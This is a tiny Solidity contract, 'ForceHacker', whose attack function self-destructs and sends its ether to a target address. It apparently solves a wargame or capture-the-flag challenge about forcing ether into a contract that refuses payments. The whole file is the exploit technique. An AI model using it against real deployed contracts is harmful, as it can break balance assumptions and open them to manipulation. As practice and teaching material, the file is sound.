// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHacker {
    function attack(address force) public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}